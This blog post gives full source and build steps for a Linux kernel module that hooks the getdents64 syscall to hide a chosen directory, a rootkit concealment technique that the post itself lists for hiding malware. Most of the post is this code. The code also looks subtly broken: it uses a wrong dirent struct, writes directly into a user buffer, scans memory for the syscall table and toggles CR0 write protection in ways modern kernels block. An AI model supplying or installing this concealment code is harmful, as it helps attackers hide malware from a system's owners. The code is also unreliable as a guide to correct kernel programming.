---
title: "Hooking `getdents64` to Hide Directories in Linux"
tags: ['System Security', 'Low level', 'Rootkits', 'Malware']
date: 2024-06-05
author: 'Ren'
authorlink: 'https://about.0x0060.dev/'
toc: true
---

# Hooking `getdents64` to Hide Directories in Linux

Syscall hooking is a technique used in operating system development to intercept system calls made by user-space applications. This allows developers to modify or monitor the behavior of those calls without altering the application code. One common use case is hiding files or directories, which can be useful for security applications or debugging.

## Use Cases

| Use Case                     | Description                                          |
|------------------------------|------------------------------------------------------|
| **Security Monitoring**      | Intercept system calls to monitor suspicious activity. |
| **Debugging**                | Track file access patterns for debugging purposes.   |
| **Malicious Intent**         | Hide files or directories to conceal malware.       |

## Kernel Module to Hook `getdents64`

This kernel module hooks the `getdents64` syscall to hide specified directories from directory listings. Below is the implementation.

```
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#include <linux/sched.h>
#include <linux/syscalls.h>
#include <asm/unistd.h>

#define HIDDEN_DIR "hidden_dir"  // Specify the directory to hide

static unsigned long **sys_call_table;
static asmlinkage long (*original_getdents64)(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);

struct linux_dirent64 {
    unsigned long d_ino;        /* Inode number */
    unsigned long d_off;        /* Offset to the next dirent */
    unsigned short d_reclen;    /* Length of this record */
    char d_name[];              /* Filename (null-terminated) */
};

static asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count) {
    long ret = original_getdents64(fd, dirent, count);
    struct linux_dirent64 *d;
    unsigned long offset = 0;
    unsigned long bpos = 0;

    while (bpos < ret) {
        d = (struct linux_dirent64 *)((char *)dirent + bpos);
        if (strcmp(d->d_name, HIDDEN_DIR) == 0) {
            // Adjust return value and offset
            ret -= d->d_reclen;
            memmove(d, (char *)d + d->d_reclen, ret - bpos);
        } else {
            bpos += d->d_reclen;
        }
    }

    return ret;
}

static unsigned long **find_sys_call_table(void) {
    unsigned long offset;
    unsigned long **sct;

    // This function can change between kernel versions
    for (offset = PAGE_OFFSET; offset < ULLONG_MAX; offset += sizeof(void *)) {
        sct = (unsigned long **)offset;
        if (sct[__NR_close] == (unsigned long *) sys_close) {
            return sct;
        }
    }
    return NULL;
}

static int __init hook_init(void) {
    // Find the syscall table
    sys_call_table = find_sys_call_table();
    if (!sys_call_table) {
        return -1;
    }

    // Disable write protection
    write_cr0(read_cr0() & ~0x10000);

    // Hook the syscall
    original_getdents64 = (void *)sys_call_table[__NR_getdents64];
    sys_call_table[__NR_getdents64] = (unsigned long *)hooked_getdents64;

    // Restore write protection
    write_cr0(read_cr0() | 0x10000);

    return 0;
}

static void __exit hook_exit(void) {
    // Disable write protection
    write_cr0(read_cr0() & ~0x10000);

    // Restore original syscall
    sys_call_table[__NR_getdents64] = (unsigned long *)original_getdents64;

    // Restore write protection
    write_cr0(read_cr0() | 0x10000);
}

module_init(hook_init);
module_exit(hook_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("0x0060");
MODULE_DESCRIPTION("A kernel module to hook getdents64 to hide directories");
```

## Explanation of Key Components

| Component                  | Description                                                                 |
|----------------------------|-----------------------------------------------------------------------------|
| **sys_call_table**         | Pointer to the syscall table where system calls are located.                |
| **original_getdents64**    | Pointer to the original `getdents64` syscall implementation.                |
| **hooked_getdents64**      | Function that replaces `getdents64` to modify its behavior.                 |
| **find_sys_call_table()**  | Function that locates the syscall table in memory.                          |
| **hook_init()**            | Initializes the module and hooks the syscall.                               |
| **hook_exit()**            | Cleans up by restoring the original syscall and unloading the module.       |

## Compilation Instructions

1. **Save the code** to a file named `hide_dir.c`.

2. **Create a Makefile** in the same directory:

```
obj-m += hide_dir.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

3. **Compile the module**:

```
make
```

4. **Load the module**:

```
sudo insmod hide_dir.ko
```

5. **Check for errors**:

```
dmesg | tail
```

6. **Unload the module**:

```
sudo rmmod hide_dir
```

## Important Notes

- **Kernel Version Compatibility**: The syscall table and method to find it can vary between kernel versions. The provided method is a simplistic approach and may need adjustments.
- **Security and Stability**: Modifying the syscall table can lead to system crashes and security vulnerabilities. This code should only be run in a controlled environment.
- **Legal and Ethical Considerations**: Ensure you have permission to manipulate the system in this way, and use this knowledge responsibly.

Always test kernel modules in a safe environment, such as a virtual machine.
